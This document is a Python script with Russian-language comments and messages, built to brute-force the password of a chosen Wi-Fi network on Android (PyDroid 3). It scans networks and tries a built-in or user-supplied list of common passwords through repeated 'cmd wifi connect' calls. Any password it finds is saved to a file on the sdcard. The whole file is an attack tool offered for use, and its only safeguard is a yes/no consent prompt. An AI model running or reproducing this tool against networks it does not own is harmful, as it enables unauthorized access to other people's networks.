#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Wi-Fi Password Brute Force для Android (PyDroid 3)
Автоматический подбор пароля к выбранной сети
"""

import os
import sys
import subprocess
import time
import json
from datetime import datetime
from threading import Thread
import socket

# Цветной вывод
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    WHITE = '\033[97m'
    END = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class WiFiBruteFo:
    def __init__(self):
        self.networks = []
        self.selected_network = None
        self.found_password = None
        self.attempts = 0
        self.start_time = None
        
    def print_header(self):
        """Вывод заголовка"""
        print(f"\n{Colors.CYAN}{'=' * 60}")
        print(f"{Colors.BOLD}{Colors.YELLOW}     📱 WI-FI PASSWORD BRUTE FORCE")
        print(f"{Colors.BOLD}{Colors.YELLOW}     (PyDroid 3 для Android)")
        print(f"{Colors.CYAN}{'=' * 60}{Colors.END}\n")
    
    def request_permission(self):
        """Запрос разрешения"""
        print(f"{Colors.CYAN}{'=' * 60}")
        print(f"{Colors.YELLOW}🔐 ЗАПРОС РАЗРЕШЕНИЯ")
        print(f"{Colors.CYAN}{'=' * 60}")
        print(f"\n{Colors.RED}⚠️  ВАЖНО:{Colors.END}")
        print(f"{Colors.WHITE}Этот скрипт подбирает пароли методом перебора")
        print(f"Используйте ТОЛЬКО на своих Wi-Fi сетях!{Colors.END}")
        print(f"\n{Colors.RED}❌ Использование на чужих сетях НЕЗАКОННО!{Colors.END}")
        print(f"\n{Colors.WHITE}Вы понимаете и даете согласие? (да/нет): {Colors.END}", end="")
        
        response = input().strip().lower()
        if response in ['да', 'yes', 'y', 'д', '+']:
            print(f"{Colors.GREEN}✅ Согласие дано!\n{Colors.END}")
            return True
        else:
            print(f"{Colors.RED}❌ Согласие не дано. Выход...\n{Colors.END}")
            return False
    
    def scan_networks(self):
        """Сканирование Wi-Fi сетей"""
        print(f"{Colors.CYAN}🔍 Сканирование Wi-Fi сетей...\n{Colors.END}")
        
        try:
            # Попытка получить сети через команду
            result = subprocess.run(
                ["cmd", "wifi", "list-networks"],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            if result.returncode == 0:
                lines = result.stdout.split('\n')
                for line in lines:
                    if line.strip() and 'Network' not in line and 'SSID' not in line:
                        parts = line.split()
                        if len(parts) >= 2:
                            try:
                                network_id = parts[0]
                                network_name = ' '.join(parts[1:])
                                self.networks.append({
                                    'id': network_id,
                                    'name': network_name
                                })
                            except:
                                pass
            
            if self.networks:
                print(f"{Colors.GREEN}✅ Найдено сетей: {len(self.networks)}\n{Colors.END}")
                return True
            else:
                print(f"{Colors.YELLOW}⚠️  Сети не найдены\n{Colors.END}")
                return False
                
        except Exception as e:
            print(f"{Colors.YELLOW}⚠️  Ошибка при сканировании: {e}\n{Colors.END}")
            return False
    
    def display_networks(self):
        """Вывод списка сетей"""
        print(f"{Colors.CYAN}{'=' * 60}")
        print(f"{Colors.YELLOW}📡 ДОСТУПНЫЕ WI-FI СЕТИ")
        print(f"{Colors.CYAN}{'=' * 60}\n{Colors.END}")
        
        for idx, network in enumerate(self.networks, 1):
            print(f"{Colors.WHITE}{idx}. {Colors.GREEN}{network['name']}{Colors.END}")
        print()
    
    def select_network(self):
        """Выбор сети пользователем"""
        while True:
            try:
                choice = input(f"{Colors.YELLOW}Выберите номер сети (1-{len(self.networks)}): {Colors.END}")
                choice = int(choice) - 1
                
                if 0 <= choice < len(self.networks):
                    self.selected_network = self.networks[choice]['name']
                    print(f"{Colors.GREEN}✅ Выбрана сеть: {self.selected_network}\n{Colors.END}")
                    return True
                else:
                    print(f"{Colors.RED}❌ Неверный выбор. Попробуйте еще раз.\n{Colors.END}")
            except ValueError:
                print(f"{Colors.RED}❌ Введите число!\n{Colors.END}")
    
    def load_passwords(self):
        """Загрузка словаря паролей"""
        wordlists = [
            "common_passwords.txt",
            "/sdcard/common_passwords.txt",
            "/data/data/com.termux/files/home/common_passwords.txt",
            "passwords.txt",
            "/sdcard/passwords.txt"
        ]
        
        for wordlist_path in wordlists:
            if os.path.exists(wordlist_path):
                print(f"{Colors.CYAN}📂 Найден словарь: {wordlist_path}\n{Colors.END}")
                try:
                    with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                        passwords = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                    return passwords
                except Exception as e:
                    print(f"{Colors.YELLOW}⚠️  Ошибка при чтении: {e}\n{Colors.END}")
        
        print(f"{Colors.YELLOW}⚠️  Словарь паролей не найден\n{Colors.END}")
        print(f"{Colors.CYAN}📝 Создаю встроенный список паролей...\n{Colors.END}")
        
        # Встроенный список популярных паролей
        default_passwords = [
            # Числа
            "123456", "12345678", "123456789", "1234567890",
            "111111", "222222", "333333", "444444", "555555",
            "666666", "777777", "888888", "999999", "000000",
            
            # Слова
            "password", "admin", "root", "user", "test",
            "guest", "default", "qwerty", "abc123",
            
            # Комбинации
            "admin123", "admin@123", "password123",
            "root123", "test123", "user123",
            
            # Популярные комбинации
            "12345678", "87654321", "123123",
            "321321", "qwerty123", "welcome", "monkey",
            
            # WiFi типичные
            "wifi123", "wifipass", "password123",
            "87654321", "abcdefgh", "wifinetwork",
            
            # Простые
            "1111", "2222", "3333", "4444", "5555",
            "6666", "7777", "8888", "9999", "0000",
        ]
        
        return default_passwords
    
    def test_password(self, password):
        """Проверка пароля подключением"""
        try:
            print(f"{Colors.WHITE}[{self.attempts}] Проверка: {Colors.YELLOW}{password}{Colors.END}", end='\r')
            sys.stdout.flush()
            
            # Попытка подключиться к сети
            try:
                result = subprocess.run(
                    ["cmd", "wifi", "connect", f"name={self.selected_network}", f"password={password}"],
                    capture_output=True,
                    text=True,
                    timeout=3
                )
            except:
                pass
            
            time.sleep(0.5)
            
            # Проверка статуса подключения
            try:
                status_result = subprocess.run(
                    ["cmd", "wifi", "get-status"],
                    capture_output=True,
                    text=True,
                    timeout=3
                )
                
                output = status_result.stdout.lower()
                
                if "connected" in output or "подключено" in output:
                    return True
            except:
                pass
            
            return False
            
        except Exception as e:
            return False
    
    def brute_force(self):
        """Подбор пароля"""
        print(f"{Colors.CYAN}🔓 Загрузка словаря паролей...\n{Colors.END}")
        passwords = self.load_passwords()
        
        if not passwords:
            print(f"{Colors.RED}❌ Не удалось загрузить пароли\n{Colors.END}")
            return False
        
        print(f"{Colors.GREEN}✅ Загружено паролей: {len(passwords)}\n{Colors.END}")
        print(f"{Colors.CYAN}🔓 Начинаем подбор пароля...\n{Colors.END}")
        
        self.start_time = time.time()
        
        for idx, password in enumerate(passwords, 1):
            self.attempts = idx
            
            if self.test_password(password):
                elapsed_time = time.time() - self.start_time
                print(f"\n\n{Colors.GREEN}{'=' * 60}")
                print(f"✅ ПАРОЛЬ НАЙДЕН!{Colors.END}")
                print(f"{Colors.GREEN}{'=' * 60}{Colors.END}")
                print(f"{Colors.YELLOW}Сеть: {self.selected_network}{Colors.END}")
                print(f"{Colors.YELLOW}Пароль: {Colors.GREEN}{password}{Colors.END}")
                print(f"{Colors.CYAN}Попыток: {self.attempts}{Colors.END}")
                print(f"{Colors.CYAN}Время: {elapsed_time:.2f} секунд\n{Colors.END}")
                
                self.found_password = password
                return True
            
            # Показываем прогресс каждые 5 попыток
            if idx % 5 == 0:
                elapsed = time.time() - self.start_time
                speed = idx / elapsed if elapsed > 0 else 0
                remaining = (len(passwords) - idx) / speed if speed > 0 else 0
                print(f"{Colors.CYAN}Попытка {idx}/{len(passwords)} | Скорость: {speed:.1f} п/сек | Осталось: {remaining:.0f}сек{Colors.END}        ", end='\r')
                sys.stdout.flush()
        
        elapsed_time = time.time() - self.start_time
        print(f"\n\n{Colors.RED}❌ Пароль не найден за {elapsed_time:.2f} сек\n{Colors.END}")
        return False
    
    def save_result(self):
        """Сохранение результата"""
        try:
            result = {
                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'network': self.selected_network,
                'password': self.found_password,
                'attempts': self.attempts,
                'status': 'Успешно' if self.found_password else 'Не найдено'
            }
            
            # Несколько вариантов пути для сохранения
            possible_paths = [
                '/sdcard/wifi_results.txt',
                '/storage/emulated/0/wifi_results.txt',
                os.path.expanduser('~/wifi_results.txt'),
                'wifi_results.txt'
            ]
            
            for filepath in possible_paths:
                try:
                    if os.path.dirname(filepath):
                        os.makedirs(os.path.dirname(filepath), exist_ok=True)
                    with open(filepath, 'a', encoding='utf-8') as f:
                        f.write(json.dumps(result, ensure_ascii=False) + '\n')
                    print(f"{Colors.GREEN}✅ Результат сохранен: {filepath}\n{Colors.END}")
                    return True
                except:
                    continue
            
            print(f"{Colors.YELLOW}⚠️  Не удалось сохранить в файл\n{Colors.END}")
            return False
            
        except Exception as e:
            print(f"{Colors.RED}❌ Ошибка при сохранении: {e}\n{Colors.END}")
            return False
    
    def run(self):
        """Главный цикл"""
        try:
            self.print_header()
            
            # Запрос разрешения
            if not self.request_permission():
                return
            
            # Сканирование сетей
            if not self.scan_networks():
                print(f"{Colors.YELLOW}Включите Wi-Fi и попробуйте еще раз\n{Colors.END}")
                return
            
            # Вывод списка
            self.display_networks()
            
            # Выбор сети
            if not self.select_network():
                return
            
            # Подбор пароля
            if self.brute_force():
                # Сохранение результата
                self.save_result()
                print(f"{Colors.GREEN}✅ Операция завершена успешно!\n{Colors.END}")
            else:
                print(f"{Colors.YELLOW}⚠️  Попробуйте добавить больше паролей\n{Colors.END}")
                print(f"{Colors.CYAN}Создайте файл common_passwords.txt с паролями\n{Colors.END}")
        
        except KeyboardInterrupt:
            print(f"\n\n{Colors.YELLOW}⚠️  Программа прервана пользователем\n{Colors.END}")
        except Exception as e:
            print(f"\n{Colors.RED}❌ Ошибка: {e}\n{Colors.END}")
            import traceback
            traceback.print_exc()


def main():
    brute_force = WiFiBruteFo()
    brute_force.run()


if __name__ == "__main__":
    main()
